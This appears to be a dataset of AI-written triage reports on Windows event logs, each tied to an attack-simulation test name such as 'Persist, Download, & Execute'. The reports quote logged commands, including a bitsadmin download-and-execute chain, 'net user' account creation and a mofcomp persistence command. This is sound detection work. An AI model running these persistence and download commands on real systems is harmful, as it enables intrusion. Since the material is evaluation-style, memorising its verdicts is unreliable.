     - The script's intent to alter registry keys related to Excel is concerning, particularly since it seems to execute changes without any clear legitimate purpose or user interaction.
     - `.xll` files are known vectors for malicious payloads.
     - The behavior of embedding add-ins programmatically and modifying startup properties indicates potential malicious activity, often associated with attempts to gain persistence on the system.

2. **Sysmon Logs:**
   - **Analysis:** 
     The Sysmon logs display multiple process creations involving `MicrosoftEdgeUpdate.exe` and PowerShell commands. The frequent use of PowerShell, especially paired with the execution of scripts that alter system settings or registry keys (as in the above point), is often utilized in lateral movement or initial access by malicious entities.
   - **Suspicion Indicators:**
     - Execution of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` with various command-line arguments might be benign from a software update perspective. However, its coexistence with suspicious PowerShell activity requires further examination.
     - The combination of high integrity level execution and modifications to critical paths and registry entries marks potentially harmful activity.

3. **Other Process Executions:**
   - Multiple high-privilege processes and system-level tasks (like `sppsvc.exe`, `wevtutil.exe`, `wsmprovhost.exe`) are being executed, which, in isolation, are not suspect but could be part of a larger chain of operations when observed with other suspicious activities.

### Indicators of Malicious Activity or Compromise:

- **PowerShell Script Execution:** Modify registry settings and manipulate Excel start-up properties with potentially harmful `.xll` files.
- **Unusual File Copies and Registry Modifications:** Activities generally associated with the installation of unauthorized software or persistence mechanisms by advanced threats.

### Conclusion:

Given the activities observed, the behavior of the PowerShell script raises significant red flags related to possible malicious compromises. This activity aligns with common tactics used in targeted attacks, where registry keys and startup parameters are altered to maintain persistence.

**Resolution: MALICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected machine to prevent further spread or data exfiltration.
   - Conduct a thorough assessment of the `.xll` files and PowerShell scripts used.
   - Review and reverse any unauthorized registry changes and file modifications.

2. **Further Investigation:**
   - Investigate the source of the PowerShell script and its invocation context to identify initial access points.
   - Analyze network activity logs to determine any potential data loss or external communications.

3. **Preventative Measures:**
   - Enhance monitoring and alerting for similar PowerShell and registry modification activities across the network.
   - Implement stricter execution policies to limit PowerShell scripts unless explicitly authorized."
Create a new account similar to ANONYMOUS LOGON,"### Analysis of the Windows Event Logs

Upon reviewing the provided Sysmon, Security, Application, and System logs, the following observations and assessments have been made:

#### Suspicious Activities:
1. **Creation of User Account via Command Prompt:**
   - Event ID 1 from Sysmon shows a `cmd.exe` process executing the command: `cmd.exe /c net user ""ANONYMOUS LOGON"" ""data_pass123!"" /add /domain`. This is a strong indicator of suspicious activity. The creation of a user account named `ANONYMOUS LOGON` with a specific password suggests potential unauthorized activity, possibly indicating preparatory steps for further unauthorized access or privilege escalation.

2. **Execution of System Utilities by Non-System User:**
   - `whoami.exe` and `wevtutil.exe` were executed by the user `SERVER002\admin_test`. While `whoami.exe` is used for checking current user identity, `wevtutil.exe` is used for managing event logs, typically requiring administrative privileges. Frequent and rapid execution of these tools by an `admin_test` user might indicate reconnaissance or attempts to cover tracks.

3. **Time Changes in System Logs:**
   - There are events showing minor changes in system time (EventID 4616), which can sometimes be indicative of an attacker attempting to manipulate audit logs. However, the changes are very small and might arise during normal time synchronization activities.

4. **Frequent Launch of `conhost.exe`:**
   - Numerous `conhost.exe` instances are launched alongside command-line executions, which could be expected if these commands are run through a command shell. However, given the context of account creation via command line, it deserves further scrutiny to rule out the execution of malicious scripts.

#### Benign Activities:
1. **Windows Defender and Software Updates:**
   - Multiple logs indicate that Windows Defender is operational and that security intelligence updates have been executed, suggesting a regular antivirus update cycle.

2. **System Processes Executed by `NT AUTHORITY\SYSTEM`:**
   - Processes like `MpSigStub.exe`, `wuauclt.exe`, `conhost.exe`, and `MpCmdRun.exe` are known Windows components related to security and update management, run by `NT AUTHORITY\SYSTEM`. There are no immediate signs of tampering with these processes.

### Assessment
The particular attention to the `net user` command execution stands out as a key indicator of potential malicious activity. This action implies unauthorized access or administrative rights misuse to add a user to the domain, likely aiming to establish persistence or facilitate further attacks.

### Resolution
**Resolution: MALICIOUS**

The evidence strongly suggests an unauthorized attempt to create a new user account with administrative implications, which is typically a malicious act. Immediate attention is warranted to assess and mitigate potential threats:

### Guidance on Next Steps
1. **Immediate User Account Review:**
   - Review the ""ANONYMOUS LOGON"" user account creation. Ensure its removal and check for any additional unauthorized account creations.

2. **Audit User Actions:**
   - Review logs for actions performed by `SERVER002\admin_test` around the same timeframe for any other suspicious activities.

3. **Check for Privilege Escalation:**
   - Validate if `SERVER002\admin_test` had legitimate access to perform these actions. Investigate possible privilege escalation vulnerabilities.

4. **Incident Response Activation:**
   - Engage your incident response team to thoroughly investigate potential breaches and ensure systems are secure and patched against known vulnerabilities.

5. **Enhance Monitoring:**
   - Consider enhancing your monitoring solutions to alert on abnormal account management activities and command-line executions for proactive threat detection."
Install MS Exchange Transport Agent Persistence,"### Detailed Analysis of Windows Event Logs

#### Suspicious or Anomalous Behavior:

1. **Security Log Anomalies:**
   - The user `admin_test` is seen acquiring a session via event ID `4624` (successful logon) using NTLM authentication, which might not be unusual if `admin_test` is a known administrative account.
   - Event ID `4672` shows `admin_test` receiving high privileges, including `SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc. While it’s expected for admin accounts to have elevated privileges, this series of privileges can sometimes be abused by attackers for actions like injecting into processes, bypassing security models, or increasing execution capabilities.

2. **PowerShell Log Anomalies:**
   - The PowerShell script executed appears to be installing and enabling a `TransportAgent` related to Microsoft Exchange. This specific command execution:
     ```
     Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll
     Enable-TransportAgent Security Interop Agent
     ```
     - If this is intended behavior within the organization for tasks like setting up or configuring Exchange, it could be benign. However, if unexpected, it may indicate unauthorized configuration changes or attempts to manipulate email processing.

3. **Sysmon Log Anomalies:**
   - Numerous instances of `powershell.exe`, `wevtutil.exe`, and manipulation of processes suggest this host might undertake typical administrative tasks; however, these commands are commonly used for lateral movement and persistence by attackers.
   - Specific use of tools like `whoami.exe` might suggest someone is establishing the current user's context post initial access.
   - The presence and execution of multiple `MicrosoftEdgeUpdate` processes may suggest regular updates, but the high volume in close succession under `SYSTEM` context could insinuate attempts to blend malicious processing with legitimate updates.

#### Indicators of Malicious Activity:

- **Privilege Escalation and Admin Rights:** The user `admin_test` acquiring high privileges is common with both legitimate administrator tasks and lateral movement attempts by attackers.
  
- **PowerShell Usage:** The complex command executed via PowerShell implies potential automation or orchestration tasks, which could be leveraged by malicious actors if they have managed to create or alter scheduled tasks or startup scripts.

#### Assessment of Situation:

By analyzing the context of these events:
- **Elevated privileges** for `admin_test`, combined with specific and complex **PowerShell execution**, might indicate a deep configuration or setup task such as service setup, or potentially malicious activity if unauthorized.
- Frequent utilization of Sysmon logs to track PowerShell and executable activities reflects standard monitoring practices but may also indicate observed unusual or suspicious activity warranting such scrutiny.

**Threats or Risks Identified:**
- If any of the observed setups (like Exchange configuration) was not pre-approved or documented, this could highlight unauthorized administrative access and execution of potentially harmful scripts.
  
**Guidance on How to Proceed:**
- **Verify Account and Privilege Usage:** Cross-check the necessity and authenticity of actions performed by `admin_test`.
- **Review PowerShell Scripts:** Ensure that the invoked scripts correspond to approved change tasks or administrative actions.
- **Monitor Further Activities:** Continue to monitor for any unexpected tasks, especially around the use of tools known for lateral movement or execution, like PowerShell and NTLM authentications.
- **Pose an Alert for Excessive User Privileges:** Profiles with broad privileges should be logged and reviewed regularly.

### Final Resolution: **SUSPICIOUS**

While some of the activities might represent benign administrative actions, the complexity and nature of the commands, combined with high use of privileged access, suggest there could be potentially unauthorized activities. Further investigation is warranted to ensure system integrity and security compliance."
"Persist, Download, & Execute","## Detailed Log Analysis:

### Indicators of Interest:

- **Sysmon Events**: 
  - **Suspicious Usage of `bitsadmin.exe`**: There's evidence of `bitsadmin.exe` being employed with command-line arguments that indicate file download operations from `https://raw.githubusercontent.com/` into a temporary location, followed by a setup to execute `notepad.exe`. The command chain used is `""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline fileBITS C:\\Windows\\system32\\notepad.exe NULL & bitsadmin.exe /resume fileBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete fileBITS`. This sequence is considered potentially malicious, as `bitsadmin.exe` is often used in malicious contexts to download and execute payloads silently.
  
- **Security Events**:
  - **Privileged Access**: The user `admin_test` has been granted a wide range of privileges including `SeDebugPrivilege` and `SeBackupPrivilege`, which are not typical for regular operations and can be used for malicious activities like privilege escalation or persistence.

- **Time Anomalies**:
  - **Time Change**: The system time appears to have changed unexpectedly as recorded in both Security (4616) and System (1, 24) logs. While it can happen due to administrative corrections, in context with the other findings, it could be used to cover tracks in log investigations.

### Assessment:

The execution of `bitsadmin.exe` with multiple commands linked to potentially downloading a script and setting `notepad.exe` as a command line notifier is highly unusual and raises significant red flags. Coupled with the execution under a highly privileged account (`admin_test`) and an unusual adjustment in system time, these actions align with tactics, techniques, and procedures (TTPs) commonly used in malware distribution and execution.

### Resolution:

- **MALICIOUS**: The combined evidence suggests a coordinated attempt to perform potentially harmful operations on the host. The use of `bitsadmin.exe` for download and execution coupled with high-level privileges and system time changes strengthens the case for malicious intent.

"
Windows MOFComp.exe Load MOF File,"Analyzing the provided logs, there are several points of interest that could indicate potential suspicious activities. Here's a detailed evaluation:

### 1. PowerShell Execution:
- The execution of `powershell.exe` is noted with the command line `""powershell.exe"" & {c:\windows\system32\wbem\mofcomp.exe \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.mof\""}`.
- PowerShell is often used for both administrative tasks and exploitation activities. In this context, running `mofcomp.exe` to compile MOF files located in a temporary directory is unusual and could be an indicator of compromise. Attackers may use MOF files to establish persistence or execute malicious payloads.

### 2. Frequent Execution of `wevtutil.exe` and `conhost.exe`:
- Frequent execution of `wevtutil.exe` is noted, which is a tool used to manage event logs. While it can be used legitimately by administrators, its use for clearing or tampering with logs is a common tactic for attackers to cover their tracks.
- There are multiple instances of `conhost.exe` processes, which are normal when interacting with console applications. However, they may need further correlation with parent processes to identify if they are suspicious.

### 3. Microsoft Edge Update:
- Regular activity involving `MicrosoftEdgeUpdate.exe`, including launching various components such as `MicrosoftEdgeUpdateComRegisterShell64.exe`. This is typical of update services but should be verified to ensure it's not used as a masquerading technique.

### 4. WSM Provider Host:
- The parent process for several `powershell.exe` and `whoami.exe` executions is `wsmprovhost.exe`. This is part of Windows Remote Management, and it's normal in remote scripts execution, but it could also point to remote command execution by an attacker if unauthorized.

### 5. WMI Query:
- An error with a WMI query that targets `notepad.exe` suggests possible monitoring or manipulation, but it's not wholly indicative of malicious intent. It requires context that is not fully clear.

### 6. Lack of Security and System Logs:
- Given the absence of security and system logs, it's difficult to correlate these activities with login attempts, failed audits, or system service changes, which are crucial for understanding context and potential unauthorized actions.

### Assessment:

Based on the analysis, the following resolution is made:

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Further Investigation:**
   - Examine the MOF file and any related scripts or payloads to understand their potential impact.
   - Verify the legitimacy of `MicrosoftEdgeUpdate.exe` operations, ensuring they follow usual patterns.
   - Cross-reference with user activity, inbound/outbound network traffic, and any antivirus/IDS logs to identify possible anomalies.

2. **Containment:**
   - If possible, isolate the system for detailed forensic analysis while keeping it in a state that preserves all evidence.

3. **Review Permissions:**
   - Assess user permissions and access rights, specifically those of `admin_test` and similar accounts.

4. **Audit Logs:**
   - Enhance logging and auditing, ensuring that critical events are properly captured and reviewed, especially in the security and system channels.

The elevated usage of PowerShell commands, MOF compilation, and utilization of wevtutil for potential log manipulation are red flags that warrant further investigation to rule out malicious intent."
Persistent Code Execution Via Word Add-in File (WLL),"Based on the provided Windows event logs, let's analyze for any indicators of malicious activity:

### PowerShell Logs
The PowerShell logs indicate that a script was executed with the following characteristics:
- The script uses `New-Object -COMObject ""Word.Application""` to interact with Microsoft Word.
- It contains logic to copy files (`wordwll_x64.wll` or `wordwll_x86.wll`) from the Temp directory to the Word Startup folder, which could trigger on the next start of Word, potentially executing additional code within Word's context.
- The script calls `Stop-Process -Name ""WinWord""` and `Start-Process ""WinWord""`, which is an unusual operation for typical user scripts and does indicate an attempt to restart the Word application.

### Sysmon Logs
- The logs show processes involving `MicrosoftEdgeUpdateComRegisterShell64.exe` and `MicrosoftEdgeUpdate.exe`. These processes running under `NT AUTHORITY\SYSTEM` could be legitimate Edge browser updates, but frequent invocations alongside the PowerShell script are unusual.
- The repetitive spawning of `powershell.exe` and `conhost.exe` under `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM` indicate possible manipulation or execution automation managed using system privileges. This could indicate a privilege escalation attempt or system abuse for executing unauthorized scripts.
  - PowerShell involves variables and manipulation of application startups which can be an indicator of malicious persistence mechanisms.

### Evaluation of Findings
- **PowerShell Activity**: The script behavior is suspicious. Although scripting for administrative tasks can include some automation, the manipulation of startup folders, and forced restarts of applications (Word) indicates a possible persistence technique used in attacks.
  
- **Sysmon Activity**: The repeated Edge update processes and PowerShell executions suggest unauthorized or atypical automated tasks may be executed with elevated privileges.

Given the overall behavior described in the logs: script executions involving process control, potential persistence techniques, PowerShell script interactions with Office applications, and processes executed under system authority — all of these indicate an attempt to execute potentially unwanted or malicious activity on the host.

### Resolution
Based on the evidence from the logs:
- **Resolution**: **MALICIOUS**

### Guidance
1. **Immediate Isolation**: Disconnect the affected machine from the network to prevent further spread of any potential malware.
2. **Forensics Analysis**: Conduct a full forensic analysis to uncover the source of the script and any other affected files or systems.
3. **Review and Remediate**: Check startup folders, scheduled tasks, and any service modifications, especially those involving Word or Edge components.
4. **Update Security Policies**: Review and tighten execution policies for PowerShell, and ensure that logs are collected and monitored regularly for similar suspicious activities.

Initiate a response plan to contain and mitigate the identified threats and plan to restore from clean backups after clearing all identified malicious components."
Web Shell Written to Disk,"Upon analyzing the provided Windows event logs from the host Server002, I've identified some areas of interest:

### Application Logs:
- **edgeupdate Service Stopped**: An event with EventID: 0 indicated that the `edgeupdate` service was stopped. While this isn't necessarily suspicious on its own, stopping update services can sometimes be used to prevent security updates from being applied.
- **Windows Defender**: Multiple entries (EventID: 15) confirmed that Windows Defender was on, ensuring some level of security monitoring.

### Sysmon Logs:
- **PowerShell Execution**: The execution of `powershell.exe` under the `SERVER002\admin_test` account (ProcessId: 6936) could be a point of interest, especially since PowerShell can be used for legitimate purposes but also for malicious activities.
- **Command-line Activity**: The execution of `xcopy.exe` and `cmd.exe` with parameters that automate copying files to `C:\inetpub\wwwroot` could indicate data exfiltration or preparation of files for execution. This directory is typically used for hosting web content, indicating the possibility of a web server modification or staging area for content deployment.
- **EdgeUpdate Activities**: Multiple entries indicate activities related to `MicrosoftEdgeUpdate.exe`. These seem to be typical background operations related to Microsoft Edge Update. However, extensive use of Edge Updater with temp directory executions and user impersonation by `NT AUTHORITY\SYSTEM` should be scrutinized in scenarios where this has not been a routine operation historically.
- **System Files Execution**: Execution of system utilities like `whoami.exe`, `hostname.exe`, and `cmd.exe` under a high integrity level by the `SERVER002\admin_test` user could suggest privilege utilization that merits validation against expected administrative tasks.
  
Given the context of these log entries:

### Assessment:
1. **PowerShell Activity**: Requires further investigation for legitimacy, especially if there's no routine administration script usage context.
2. **File Copying to Web Root**: This particular sequence related to `xcopy.exe` being run via `cmd.exe` to transfer files to `C:\inetpub\wwwroot` is highly suspicious and may indicate unauthorized content deployment.
3. **EdgeUpdater Operations**: While generally benign, if service stoppages or permissions misalignments were unintended, review for misconfigurations or evidence of exploitation.

### Conclusion:
- Based on the information and identified activities, the logs are categorized as **SUSPICIOUS** due to the non-standard location file transfers and the use of PowerShell, potentially indicating malicious footprints like data staging or preparation for an attack vector like a web shell or unauthorized data sync.

### Recommended Actions:
- Conduct a thorough review of the PowerShell command logs and scripts that may have been executed on the host.
- Investigate recent changes or content additions to `C:\inetpub\wwwroot` for unauthorized files or scripts.
- Validate user activities, especially linked to `SERVER002\admin_test`, for context on routine tasks or anomalies.
- Implement monitoring for further suspicious activities, especially in log paths and invoke alerts for similar patterns."
Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"**Detailed Log Analysis:**

1. **Application Log:**
   - **Sysmon.exe Crashes (Event ID 1000 & 1001):** There are multiple entries indicating that Sysmon.exe, a system monitoring tool, experienced application crashes (APPCRASH). The fact that Sysmon, which is used for advanced system monitoring and detecting malicious activities, is repeatedly crashing could potentially indicate an attempt to disable security monitoring.

2. **PowerShell Log:**
   - **PowerShell Activity (Event ID 600):** The logs show PowerShell commands related to Windows Management Instrumentation (WMI) persistence. The script involves creating a WMI event subscription which is a known persistence mechanism used in advanced attacks to maintain unauthorized access. The script attempts to execute a VBScript via WMI which starts notepad.exe without user interaction.

3. **Sysmon Log:**
   - **Whoami Executions and Hostname Lookups:** There are several instances of processes such as whoami.exe and hostname.exe being executed. While these are legitimate system utilities, their use might suggest reconnaissance actions if they are not related to legitimate administrative tasks.
   - **Process Creation:** Several benign system processes and services are noted, and their existence alone doesn't directly indicate malicious activity unless correlated with suspicious behavior described above.

4. **Security Log:**
   - **Elevated Privileges (Event ID 4672):** The logs include multiple events showing that the user `SERVER002\\admin_test` was granted elevated privileges including the ability to take ownership, debug, backup, restore, etc. This is indicative of either privileged system administration or potentially malicious actions if unauthorized.
   - **Multiple Logons (Event ID 4624 and 4634):** The logs display multiple logon and logoff records which on their own are typical, but when combined with elevated privileges granted and potentially suspect user IDs, could indicate account compromise.
   - **DLL Load Attempts (Event ID 6281):** The mention of aepic.dll and fcon.dll could be suggestive of operations that were flagged by auditing security, possibly warranting further investigation into whether these are legitimate or not.

**Assessment:**

- **Suspicious Activities Identified:**
  - The recurrent crashing of Sysmon.exe could suggest attempts to disable a monitoring tool.
  - The PowerShell usage that sets up a WMI subscription for persistence is a red flag for potential malicious activity.
  - User `admin_test` was granted high-level administrative privileges which should be reviewed if such privilege grants are necessary for the user's role or an indication of privilege escalation by an attacker.

**Resolution: SUSPICIOUS**

Further investigation is warranted to confirm whether these activities are sanctioned within the organizational context or truly indicate compromise. Recommended steps include:

1. **Validation of PowerShell Execution:** Review any scripts executed in this timeframe and confirm their legitimacy with IT.
2. **Sysmon Stability Checks:** Investigate the cause of Sysmon crashes to rule out any tampering with security monitoring.
3. **Investigate User Activities:** Check the legitimacy of activities and login patterns for `admin_test` to ensure it matches expected behavior.
4. **DLL Verification:** Verify the legitimacy of loaded DLLs or any anomalous behavior noted against known and legitimate software libraries.
5. **Proactive Monitoring:** Increase logging and monitoring for any reoccurrence of this behavior to detect and respond swiftly if needed.

This analysis determines the situation as suspicious and advises further monitoring and validation to mitigate any potential risks."
Persistent Code Execution Via Excel VBA Add-in File (XLAM),"### Analysis of the Logs

1. **Unusual Processes and Command Line Execution:**
   - The logs indicate the execution of `powershell.exe` with a suspicious command that involves copying a file (`ExcelVBAaddin.xlam`) to the Excel startup folder (`XLSTART`) and starting an Excel process. This behavior is potentially indicative of an attempt to execute or persistently load malicious code via Excel add-ins.
   - The command line used in PowerShell execution and subsequent errors highlight that the path to the destination file (`notepad.xlam`) couldn't be found, suggesting either a failed attempt to write something malicious or an incorrect path.

2. **PowerShell Activity:**
   - Multiple PowerShell logs, particularly Event ID 600, show the starting of various PowerShell providers such as Registry, Alias, and FileSystem. These are standard but coupled with the command context, they suggest scripting activity.
   - Event ID 300 reports a failure in copying the add-in file. The error (ProviderInvocationException) suggests that the intended malicious operation did not fully succeed.

3. **Use of System Utilities:**
   - The use of `wevtutil.exe` by `admin_test` is abnormal if unaccompanied by legitimate administrative reasons and may signify log tampering attempts.

4. **Processes and User Context:**
   - The processes are executed by the user `SERVER002\\admin_test`, which in itself may not be suspicious unless the user's actions or roles do not typically extend to such operations.

5. **Edge Update Activities:**
   - Microsoft Edge Update processes are running with `NT AUTHORITY\\SYSTEM`, which is common for legitimate updates. However, ensuring these updates are from authentic sources is crucial in any context involving other suspicious activity.

### Assessment

- **Suspicious Activity:** The presence of PowerShell commands copying files to the Excel startup directory is suspicious, especially if unapproved and uncommon for the user `admin_test`.
- **Potential Malicious Intent:** The nature of file copying suggests malicious intent possibly aiming for persistence via Excel.
- **Process Execution Context:** Activities observed lack verification for legitimate context based on user and system roles.

### Resolution

- **Resolution: SUSPICIOUS**
   - Given the command involving PowerShell to potentially persist via Excel, coupled with unresolved paths and unusual activities by the user `admin_test`, the logs require further investigation.
   - Actions such as reviewing user actions, confirming the legitimacy of executed scripts, verifying Edge update sources, and enhancing monitoring on similar suspicious activities should be taken.

### Further Guidance

- **Immediate Actions:**
  - Verify the legitimacy of actions taken by `SERVER002\\admin_test`.
  - Cross-check the scheduled tasks or Group Policy changes related to PowerShell scripts.
  - Ensure the PowerShell script origins and check for similar patterns in enterprise environments.

- **Recommended Follow-ups:**
  - Implement an alert system for PowerShell execution with specific commands or file access related to known potential threats.
  - Engage with the potential user or responsible team to authenticate intents behind these operations.
  - Review and potentially enhance security controls for file path protection that involves paths like `AppData` or `XLSTART`."
Google Chrome Load Unpacked Extension With Command Line,"### Analysis and Findings

Upon analyzing the provided logs, we observe various events. Here is the breakdown of potential findings indicating suspicious or malicious activities:

1. **Sysmon and PowerShell Logs:**
   - **PowerShell Execution:** There is a notable PowerShell script execution that involves downloading Chromium (a browser) and a uBlock extension from remote URLs (`Invoke-WebRequest`). The sequence seems to download, unzip, and execute the browser with the extension. This is unusual and potentially suspicious behavior, as administrative users do not typically download and execute browsers using PowerShell in this manner.
   - **Frequent `wevtutil` and `conhost` Execution:** Multiple events indicate the execution of `wevtutil.exe` and `conhost.exe`. Although `wevtutil` is used for event log manipulation, which can sometimes be benign, its frequent usage in close intervals alongside `conhost` can suggest attempts to clean or alter logs or run console applications for nefarious purposes.
   - **Uncommon Usage of Windows Tools:** Execution of `whoami.exe` in the logs signifies attempts to check the current user permissions, which can be indicative of privilege reconnaissance typically used by attackers.

2. **EdgeUpdate Processes:**
   - There are multiple `MicrosoftEdgeUpdate.exe` related events. While these can often be benign as part of regular update activities, the presence of these events in between other potentially suspicious activities could indicate misuse of the update process for malicious operations, such as downloading additional software or persistence mechanisms disguising under legitimate software updates.

3. **Time Synchronization Events:**
   - The System log indicates a time change event. While this on its own is generally benign (e.g., syncing with `time.windows.com`), the change of system time can sometimes be associated with an attempt to alter logging timelines to confuse forensic investigations.

### Conclusion

Considering the analysis, the events recorded suggest anomalous and suspicious activity, primarily due to the use of PowerShell for downloading and executing a browser and extension, along with attempts at user role identification (`whoami.exe`). While no explicit malicious payloads are observed in the logs, the behavior points to suspicious activities that warrant closer examination.

In conclusion, the findings lead to a classification of **SUSPICIOUS** - the activity needs more investigation to confidently determine the intention and potential risk.

### Recommendations

1. **Immediate Actions:**
   - Perform a thorough examination of any files or tools downloaded and executed via the suspicious PowerShell script.
   - Investigate the access logs and audit trails for any unauthorized account usage or privilege escalations.

2. **Ongoing Monitoring:**
   - Increase monitoring on the system for further anomalies in process executions and network activities.
   - Utilize EDR (Endpoint Detection and Response) solutions for more in-depth behavioral analytics and threat hunting.

3. **Security Enhancements:**
   - Implement stricter PowerShell execution policies and logging to detect and prevent misuse.
   - Conduct a review of user permissions and ensure least-privilege principles are enforced. 

4. **User Awareness:**
   - Educate users on suspicious activity, emphasizing secure practices with PowerShell and the potential risks it poses if mishandled.

The actions above should help ascertain the situation's nature and mitigate any potential risks from the observed activities."
Auto-start application on user logon,"Based on the provided Windows event logs, here's the detailed analysis focusing on potential indicators of malicious activity:

### Analysis:

#### 1. **System Log:**
- The events relating to `Microsoft-Windows-Kernel-General` (EventID: 1) indicate time changes on the system (`OldTime` to `NewTime`). These changes appear to be associated with legitimate time synchronization activities as indicated by the `Microsoft-Windows-Time-Service` event where the time source is `time.windows.com`.

#### 2. **Sysmon Log:**
- A significant number of entries are related to `wevtutil.exe`, `cmd.exe`, `reg.exe`, and `conhost.exe`. The execution of `reg.exe` to add entries in the registry, specifically under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test`, is highly suspicious. This registry modification can be used to maintain persistence or to escalate privileges.
- The `cmd.exe` is seen executing commands to add registry keys, which contain names like `malware_test`. This is an indicator of potential malicious activity aiming to manipulate system settings.

#### 3. **Application Log:**
- Events related to the `edgeupdate` service stopping are benign; these logs do not indicate malicious activity by themselves.

#### 4. **Security Log:**
- The security log entries focus on time changes as well, which align with the system log entries and appear legitimate due to time synchronization.

#### 5. **Edge Update Entries:**
- There are many Sysmon logs indicating Microsoft Edge Update executions. While Edge Updates are common, any unusual behavior from these processes, like unexpected file or registry modifications, should be monitored closely. However, no specific malicious indicators were identified in these logs.

### Threats Identified:
- The execution of commands via `cmd.exe` to alter the registry with a potential ""malware_test"" component is a strong indicator of malicious activity.

### Assessment and Resolution:
Given the analysis, particularly focusing on the registry modifications which have suspicious names like ""malware_test"", the logs suggest potential malicious behavior aiming to manipulate the system settings.

**Resolution: MALICIOUS**  
The presence of registry modification attempts with a component named like ""malware_test"" suggests potentially malicious intent requiring immediate attention. Steps should include:
- Immediate isolation and forensic investigation of the affected system.
- Review and reverse any unauthorized registry modifications.
- Implement monitoring to detect similar attempts across the network.
- Conduct a security audit to identify any additional compromises or vulnerabilities."
Append malicious start-process cmdlet,"Upon analyzing the provided logs for indicators of malicious activity, the following observations have been made:

1. **PowerShell Log Analysis:**
   - There are multiple PowerShell logs indicating the execution of PowerShell scripts or commands. One particularly suspicious command involves modifying the PowerShell profile to auto-launch `calc.exe` (Windows Calculator) upon PowerShell startup. This is often seen in malicious activities where an attacker attempts to maintain persistence or execute arbitrary commands.
   - The command `Start-Process calc.exe` is embedded within a PowerShell profile modification, which is anomalous and suggests a degree of scripting or automation that might be unwanted or malicious, especially in a server environment.

2. **Security Log Analysis:**
   - The logs contain multiple instances of EventID 4672, which indicates special privileges assigned. This can suggest privilege escalation activities but also occurs during many legitimate operations. Without other corroborating signs of compromise, these entries alone do not confirm malicious activity.
   - EventID 5379 indicates attempts and failures to access resources via MicrosoftAccount credentials with no credentials returned, which can be indicative of credential harvesting attempts but can also occur during normal operations of some applications that use these credentials.

3. **Sysmon Log Analysis:**
   - The logs show several instances of PowerShell being executed by `admin_test`, an administrative user, and processes like `calc.exe` being spawned, which ties back to the PowerShell logs indicating profile changes to launch `calc.exe`.
   - Frequent executions of known system administration and maintenance tasks (like `conhost.exe`, `whoami.exe`, `wevtutil.exe`) by `admin_test` do not inherently indicate malicious activity unless correlated with unauthorized tasks.
   - A noteworthy observation is the frequent spawning of EdgeUpdate processes which, while commonly related to software updates, requires validation to ensure this activity was intended and not a context for command execution or data exfiltration.

4. **Application Log Analysis:**
   - The edgeupdate service events denote stopping and starting, consistent with software update cycles, though the timing and relation to EdgeUpdate activities noted in Sysmon should be considered.

**Assessment:**

The modification of the PowerShell profile to include the execution of `calc.exe` is suspicious and suggests unauthorized changes aimed at executing commands on every PowerShell start. Though executing `calc.exe` itself is benign, embedding such commands in a profile suggests a compromised script or misdirective administrator action that was not thoroughly vetted.

**Conclusion:**

- **Resolution: SUSPICIOUS**

Given the logs' content, especially the PowerShell profile modifications, these activities warrant further investigation:
- Investigate whether `admin_test` intentionally modified the PowerShell profile.
- Review surrounding logs for potential unauthorized access or attempts at establishing persistence.
- Check if the system retains any other signs of tampering, scripts saved in atypical locations, or other modifications consistent with adversary playbooks.
- Validate with system users and administrators if any of the actions were legit maintenance or test activities to distinguish between potential compromise and authorized practices.

Immediate remediation steps should involve reviewing profile settings, auditing user activities, and possibly restoring configuration files to a known good state if unauthorized changes are confirmed."
Create a new user in PowerShell,"After analyzing the provided Windows event logs, I have made the following observations:

### Suspicious or Anomalous Behavior:
1. **User Account Creation via PowerShell**: There is an entry in the PowerShell logs indicating that a new local user account named ""data.001_PowerShell"" was created using PowerShell with the `New-LocalUser` command. This is a suspicious activity, especially if it was not initiated by an authorized administrator, as PowerShell is often used by attackers for automation and stealthy operations.

2. **Usage of Elevated Privileges**: The security logs show that the user `admin_test` was logged in with multiple high-level privileges (SeDebugPrivilege, SeTakeOwnershipPrivilege, etc.). This user then created and modified the newly created user account ""data.001_PowerShell"" without setting a password, which can lead to unauthorized access.

3. **System Time Modification**: There are multiple entries indicating that the system time was adjusted. While not inherently malicious, it can be a tactic used to align log timestamps for activities meant to go undetected.

### Indicators of Malicious Activity:
1. **Creation of User Account Using PowerShell**: As mentioned, using PowerShell to create new accounts could potentially be a sign of malicious scripting aimed at gaining persistent access or privilege escalation.

2. **Privileged Session Activity**: The `admin_test` account performed several actions with elevated privileges shortly after logging on, including account creation which is anomalous if unexpected.

### Assessment and Guidance:

- **Assessment**: Overall, these activities suggest potentially malicious or unauthorized actions. Creating an account with no password through PowerShell, particularly under a privileged account, is a red flag for potential compromise. Given the circumstances and typical patterns of malicious activity, further investigation is warranted.

- **Resolution**: **SUSPICIOUS** - The activities logged do not conclusively indicate a malicious attack but do suggest that unauthorized actions might have occurred. 

### Guidance on How to Proceed:
1. **Immediate Investigation**:
   - Verify the legitimacy of the ""data.001_PowerShell"" account creation. Contact the user `admin_test` to confirm if they performed this action.
   - Check if similar actions have been undertaken on other systems and correlate logs to identify patterns.

2. **Monitor PowerShell Usage**:
   - Enable and review detailed PowerShell logging. Look for unusual or unauthorized execution patterns.

3. **Audit Privilege Use**:
   - Evaluate current privilege assignments for users, especially focusing on those holding high-privilege roles. Adjust as necessary to enforce the principle of least privilege.
  
4. **Security Hardening**:
   - Implement stricter controls on user creation, especially through PowerShell. Consider using Just Enough Administration (JEA) to delegate tasks in a controlled manner.
   - Set alerts for unusual account creation and changes in security policies.

5. **Review Time Synchronization**:
   - Investigate the changes made to system time. Ensure synchronization with a reliable time source to prevent log tampering or misalignment.

